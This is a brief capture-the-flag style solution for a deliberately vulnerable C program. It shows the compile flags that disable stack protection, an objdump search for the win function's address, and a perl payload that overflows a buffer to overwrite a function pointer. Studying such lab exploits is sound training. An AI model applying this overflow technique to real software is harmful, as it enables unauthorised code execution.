## Reto 3

### Compilation:

      gcc reto3.c -o reto3 -fno-stack-protector -m32

### Solution:


We must dissamble reto3 with

      objdump -d ./reto3 >> reto3.asm

Now if we search the function <win>, we will find:

      0804846b <win>:
      804846b:	55                   	push   %ebp
      804846c:	89 e5                	mov    %esp,%ebp

We want the win function to be executed, and and we needed to change the address
 of fp:

      perl -e 'print "A"x64 . "\x6b\x84\x04\x08"' | ./reto3
